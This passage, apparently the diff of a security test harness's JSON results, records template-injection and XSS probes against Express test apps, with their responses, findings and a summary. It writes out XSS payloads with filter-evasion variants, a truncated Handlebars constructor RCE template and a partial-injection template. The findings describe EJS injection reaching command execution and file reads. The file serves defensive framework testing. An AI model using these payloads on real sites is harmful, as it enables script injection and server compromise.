+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 55,
+      "test": "hbs_rce_attempt",
+      "version": "v4",
+      "data": {
+        "template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"r",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 56,
+      "test": "hbs_partial_injection",
+      "version": "v4",
+      "data": {
+        "template": "{{> (lookup . \"constructor\") }}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 57,
+      "test": "xss_escaped_basic_script",
+      "version": "v5",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;script&gt;alert(1)&lt;/script&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 58,
+      "test": "xss_raw_basic_script",
+      "version": "v5",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, <script>alert(1)</script></h1></body></html>"
+      }
+    },
+    {
+      "id": 59,
+      "test": "xss_escaped_img_onerror",
+      "version": "v5",
+      "data": {
+        "payload": "<img src=x onerror=alert(1)>",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;img src=x onerror=alert(1)&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 60,
+      "test": "xss_raw_img_onerror",
+      "version": "v5",
+      "data": {
+        "payload": "<img src=x onerror=alert(1)>",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, <img src=x onerror=alert(1)></h1></body></html>"
+      }
+    },
+    {
+      "id": 61,
+      "test": "xss_escaped_svg_onload",
+      "version": "v5",
+      "data": {
+        "payload": "<svg onload=alert(1)>",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;svg onload=alert(1)&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 62,
+      "test": "xss_raw_svg_onload",
+      "version": "v5",
+      "data": {
+        "payload": "<svg onload=alert(1)>",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, <svg onload=alert(1)></h1></body></html>"
+      }
+    },
+    {
+      "id": 63,
+      "test": "xss_escaped_event_handler",
+      "version": "v5",
+      "data": {
+        "payload": "\" onmouseover=\"alert(1)\"",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &#34; onmouseover=&#34;alert(1)&#34;</h1></body></html>"
+      }
+    },
+    {
+      "id": 64,
+      "test": "xss_raw_event_handler",
+      "version": "v5",
+      "data": {
+        "payload": "\" onmouseover=\"alert(1)\"",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, \" onmouseover=\"alert(1)\"</h1></body></html>"
+      }
+    },
+    {
+      "id": 65,
+      "test": "xss_escaped_style_injection",
+      "version": "v5",
+      "data": {
+        "payload": "<style>body{background:red}</style>",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;style&gt;body{background:red}&lt;/style&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 66,
+      "test": "xss_raw_style_injection",
+      "version": "v5",
+      "data": {
+        "payload": "<style>body{background:red}</style>",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, <style>body{background:red}</style></h1></body></html>"
+      }
+    },
+    {
+      "id": 67,
+      "test": "xss_escaped_unicode_escape",
+      "version": "v5",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;script&gt;alert(1)&lt;/script&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 68,
+      "test": "xss_raw_unicode_escape",
+      "version": "v5",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, <script>alert(1)</script></h1></body></html>"
+      }
+    },
+    {
+      "id": 69,
+      "test": "xss_escaped_html_entities",
+      "version": "v5",
+      "data": {
+        "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 70,
+      "test": "xss_raw_html_entities",
+      "version": "v5",
+      "data": {
+        "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;script&gt;alert(1)&lt;/script&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 71,
+      "test": "xss_escaped_double_encode",
+      "version": "v5",
+      "data": {
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "escaped": false,
+        "status": 200,
+        "body": "<html><body><h1>Hello, %3Cscript%3Ealert(1)%3C/script%3E</h1></body></html>"
+      }
+    },
+    {
+      "id": 72,
+      "test": "xss_raw_double_encode",
+      "version": "v5",
+      "data": {
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, %3Cscript%3Ealert(1)%3C/script%3E</h1></body></html>"
+      }
+    },
+    {
+      "id": 73,
+      "test": "xss_escaped_null_byte",
+      "version": "v5",
+      "data": {
+        "payload": "<scr\u0000ipt>alert(1)</script>",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;scr\u0000ipt&gt;alert(1)&lt;/script&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 74,
+      "test": "xss_raw_null_byte",
+      "version": "v5",
+      "data": {
+        "payload": "<scr\u0000ipt>alert(1)</script>",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, <scr\u0000ipt>alert(1)</script></h1></body></html>"
+      }
+    },
+    {
+      "id": 75,
+      "test": "xss_escaped_mixed_case",
+      "version": "v5",
+      "data": {
+        "payload": "<ScRiPt>alert(1)</sCrIpT>",
+        "escaped": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, &lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</h1></body></html>"
+      }
+    },
+    {
+      "id": 76,
+      "test": "xss_raw_mixed_case",
+      "version": "v5",
+      "data": {
+        "payload": "<ScRiPt>alert(1)</sCrIpT>",
+        "reflected": true,
+        "status": 200,
+        "body": "<html><body><h1>Hello, <ScRiPt>alert(1)</sCrIpT></h1></body></html>"
+      }
+    },
+    {
+      "id": 77,
+      "test": "xss_escaped_basic_script",
+      "version": "v4",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 78,
+      "test": "xss_raw_basic_script",
+      "version": "v4",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 79,
+      "test": "xss_escaped_img_onerror",
+      "version": "v4",
+      "data": {
+        "payload": "<img src=x onerror=alert(1)>",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 80,
+      "test": "xss_raw_img_onerror",
+      "version": "v4",
+      "data": {
+        "payload": "<img src=x onerror=alert(1)>",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 81,
+      "test": "xss_escaped_svg_onload",
+      "version": "v4",
+      "data": {
+        "payload": "<svg onload=alert(1)>",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 82,
+      "test": "xss_raw_svg_onload",
+      "version": "v4",
+      "data": {
+        "payload": "<svg onload=alert(1)>",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 83,
+      "test": "xss_escaped_event_handler",
+      "version": "v4",
+      "data": {
+        "payload": "\" onmouseover=\"alert(1)\"",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 84,
+      "test": "xss_raw_event_handler",
+      "version": "v4",
+      "data": {
+        "payload": "\" onmouseover=\"alert(1)\"",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 85,
+      "test": "xss_escaped_style_injection",
+      "version": "v4",
+      "data": {
+        "payload": "<style>body{background:red}</style>",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 86,
+      "test": "xss_raw_style_injection",
+      "version": "v4",
+      "data": {
+        "payload": "<style>body{background:red}</style>",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 87,
+      "test": "xss_escaped_unicode_escape",
+      "version": "v4",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 88,
+      "test": "xss_raw_unicode_escape",
+      "version": "v4",
+      "data": {
+        "payload": "<script>alert(1)</script>",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 89,
+      "test": "xss_escaped_html_entities",
+      "version": "v4",
+      "data": {
+        "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 90,
+      "test": "xss_raw_html_entities",
+      "version": "v4",
+      "data": {
+        "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 91,
+      "test": "xss_escaped_double_encode",
+      "version": "v4",
+      "data": {
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 92,
+      "test": "xss_raw_double_encode",
+      "version": "v4",
+      "data": {
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 93,
+      "test": "xss_escaped_null_byte",
+      "version": "v4",
+      "data": {
+        "payload": "<scr\u0000ipt>alert(1)</script>",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 94,
+      "test": "xss_raw_null_byte",
+      "version": "v4",
+      "data": {
+        "payload": "<scr\u0000ipt>alert(1)</script>",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 95,
+      "test": "xss_escaped_mixed_case",
+      "version": "v4",
+      "data": {
+        "payload": "<ScRiPt>alert(1)</sCrIpT>",
+        "escaped": true,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    },
+    {
+      "id": 96,
+      "test": "xss_raw_mixed_case",
+      "version": "v4",
+      "data": {
+        "payload": "<ScRiPt>alert(1)</sCrIpT>",
+        "reflected": false,
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test"
+      }
+    }
+  ],
+  "findings": [
+    {
+      "id": 1,
+      "title": "EJS Template Injection: math",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"49\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 2,
+      "title": "EJS Template Injection: string_concat",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"helloworld\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 3,
+      "title": "EJS Template Injection: process_env",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"/\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 4,
+      "title": "EJS Template Injection: process_version",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"v\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 5,
+      "title": "EJS Template Injection: global_process",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"v\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 6,
+      "title": "EJS Template Injection: require_child_process",
+      "severity": "CRITICAL",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"uid=\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 7,
+      "title": "EJS Template Injection: require_fs_read",
+      "severity": "CRITICAL",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"root:\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 8,
+      "title": "EJS Template Injection: constructor_rce",
+      "severity": "CRITICAL",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"uid=\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 9,
+      "title": "EJS Template Injection: comment_injection",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"49\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 10,
+      "title": "EJS Template Injection: raw_output",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"<script>\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 11,
+      "title": "EJS Template Injection: multiline",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"49\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v5"
+    },
+    {
+      "id": 12,
+      "title": "EJS Template Injection: process_env",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"/\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v4"
+    },
+    {
+      "id": 13,
+      "title": "EJS Template Injection: process_version",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"v\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v4"
+    },
+    {
+      "id": 14,
+      "title": "EJS Template Injection: global_process",
+      "severity": "HIGH",
+      "cwe": "CWE-1336",
+      "description": "EJS renders user-controlled template with full Node.js context. Indicator \"v\" found in response.",
+      "framework_behavior": true,
+      "note": "EJS does not sandbox template execution \u2014 Express res.render() trusts template input",
+      "version": "v4"
+    },
+    {
+      "id": 15,
+      "title": "XSS via Unescaped EJS Output (basic_script)",
+      "severity": "MEDIUM",
+      "cwe": "CWE-79",
+      "description": "EJS <%- %> tag renders unescaped HTML. Framework provides both escaped (<%= %>) and unescaped (<%- %>) options. This is by design.",
+      "framework_behavior": true,
+      "note": "EJS provides unescaped output by design \u2014 framework does not warn",
+      "version": "v5"
+    },
+    {
+      "id": 16,
+      "title": "XSS via Unescaped EJS Output (unicode_escape)",
+      "severity": "MEDIUM",
+      "cwe": "CWE-79",
+      "description": "EJS <%- %> tag renders unescaped HTML. Framework provides both escaped (<%= %>) and unescaped (<%- %>) options. This is by design.",
+      "framework_behavior": true,
+      "note": "EJS provides unescaped output by design \u2014 framework does not warn",
+      "version": "v5"
+    },
+    {
+      "id": 17,
+      "title": "XSS via Unescaped EJS Output (mixed_case)",
+      "severity": "MEDIUM",
+      "cwe": "CWE-79",
+      "description": "EJS <%- %> tag renders unescaped HTML. Framework provides both escaped (<%= %>) and unescaped (<%- %>) options. This is by design.",
+      "framework_behavior": true,
+      "note": "EJS provides unescaped output by design \u2014 framework does not warn",
+      "version": "v5"
+    }
+  ],
+  "anomalies": [],
+  "summary": {
+    "total_tests": 96,
+    "findings_count": 17,
+    "anomalies_count": 0
+  }
+}
